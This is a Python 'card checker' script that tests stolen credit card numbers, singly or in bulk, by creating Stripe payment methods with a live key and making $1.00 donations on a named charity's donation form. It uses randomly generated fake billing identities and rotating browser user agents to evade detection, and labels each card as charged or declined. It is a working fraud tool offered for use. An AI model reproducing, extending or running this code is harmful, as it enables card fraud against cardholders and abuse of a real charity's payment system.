import asyncio
import json
import random
import re
import os
import aiohttp
from fake_useragent import UserAgent

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_random_info():
    first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller", "Davis", "Garcia", "Rodriguez", "Wilson"]
    return {
        "fname": random.choice(first_names),
        "lname": random.choice(last_names),
        "email": f"{random.choice(first_names).lower()}.{random.choice(last_names).lower()}{random.randint(100,999)}@example.com",
        "phone": f"{random.randint(200,999)}-{random.randint(200,999)}-{random.randint(1000,9999)}",
        "add1": f"{random.randint(1,999)} {random.choice(['Main', 'Oak', 'Pine', 'Maple', 'Cedar'])} St",
        "city": random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]),
        "state": random.choice(["California", "Texas", "Florida", "New York", "Pennsylvania"]),
        "state_short": random.choice(["CA", "TX", "FL", "NY", "PA"]),
        "zip": f"{random.randint(10000,99999)}"
    }

async def check_cc(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        if len(ano) == 2:
            ano = "20" + ano
        random_data = await get_random_info()
        email = random_data["email"]
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': UserAgent().random,
        }
        response = await session.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
        text = await response.text()
        nonce = gets(text, '<input type="hidden" name="_charitable_donation_nonce" value="', '"  />')
        if not nonce:
            return f"{fullz} | Error: Could not get nonce"
        payment_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': UserAgent().random,
        }
        payment_data = {
            'type': 'card',
            'billing_details[name]': f"{random_data['fname']} {random_data['lname']}",
            'billing_details[email]': email,
            'billing_details[address][city]': random_data['city'],
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': random_data['add1'],
            'billing_details[address][postal_code]': random_data['zip'],
            'billing_details[address][state]': random_data['state'],
            'billing_details[phone]': random_data['phone'],
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/961a2db59d; stripe-js-v3/961a2db59d; card-element',
            'referrer': 'https://needhelped.com',
            'time_on_page': str(random.randint(100000, 999999)),
            'key': 'pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr',
        }
        payment_response = await session.post('https://api.stripe.com/v1/payment_methods', headers=payment_headers, data=payment_data)
        payment_json = await payment_response.json()
        try:
            payment_id = payment_json['id']
        except:
            return f"{fullz} | Error: Could not create payment method - {payment_response.text}"
        donation_headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'user-agent': UserAgent().random,
            'x-requested-with': 'XMLHttpRequest',
        }
        donation_data = {
            'charitable_form_id': '68554709112d9',
            '68554709112d9': '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '0',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': random_data['fname'],
            'last_name': random_data['lname'],
            'email': email,
            'address': random_data['add1'],
            'address_2': '',
            'city': random_data['city'],
            'state': random_data['state'],
            'postcode': random_data['zip'],
            'country': 'US',
            'phone': random_data['phone'],
            'gateway': 'stripe',
            'stripe_payment_method': payment_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        donation_response = await session.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=donation_headers, data=donation_data)
        response_text = await donation_response.text()
        if "Thank" in response_text:
            return f"{fullz} | Charged Successfully"
        else:
            try:
                error = json.loads(response_text)["errors"][0]
                return f"{fullz} | {error}"
            except:
                return f"{fullz} | Unknown Error - {response_text}"
    except Exception as e:
        return f"{fullz} | Error: {str(e)}"

async def main():
    print("""
  ____ ____   ___ ____    ____ _   _ _____ ____ _____ ___  
 / ___|  _ \ / _ \___ \  / ___| | | | ____/ ___|_   _/ _ \ 
| |   | |_) | | | |__) || |   | |_| |  _| \___ \ | || | | |
| |___|  _ <| |_| / __/ | |___|  _  | |___ ___) || || |_| |
 \____|_| \_\\___/_____| \____|_| |_|_____|____/ |_| \___/ 
                                                           
""")
    print("1. Single Check")
    print("2. Mass Check")
    choice = input("Select option (1/2): ").strip()
    if choice == "1":
        cc_input = input("Enter CC (format: cc|mm|yyyy|cvv): ").strip()
        if not re.match(r'\d{16}\|\d{2}\|(\d{4}|\d{2})\|\d{3,4}', cc_input):
            print("Invalid CC format. Please use cc|mm|yyyy|cvv or cc|mm|yy|cvv")
            return
        async with aiohttp.ClientSession() as session:
            result = await check_cc(cc_input, session)
            print("\nResult:")
            print("═" * 50)
            print(result)
            print("═" * 50)
    elif choice == "2":
        print("\nEnter CCs (one per line) or file path. Double Enter to start checking.")
        print("Format for each CC: cc|mm|yyyy|cvv or cc|mm|yy|cvv")
        print("Press Enter twice to start checking\n")
        ccs = []
        while True:
            line = input()
            if line == "":
                if ccs:
                    break
                continue
            if os.path.exists(line):
                with open(line, 'r') as f:
                    ccs = [cc.strip() for cc in f.readlines() if cc.strip()]
                break
            elif re.match(r'\d{16}\|\d{2}\|(\d{4}|\d{2})\|\d{3,4}', line):
                ccs.append(line.strip())
            else:
                print(f"Skipping invalid format: {line}")
        if not ccs:
            print("No valid CCs provided")
            return
        print(f"\nStarting mass check for {len(ccs)} CCs...\n")
        print("Results:")
        print("═" * 80)
        async with aiohttp.ClientSession() as session:
            tasks = [check_cc(cc, session) for cc in ccs]
            for future in asyncio.as_completed(tasks):
                result = await future
                print(result)
        print("═" * 80)
        print("\nMass check completed!")
    else:
        print("Invalid choice")

if __name__ == "__main__":
    asyncio.run(main())
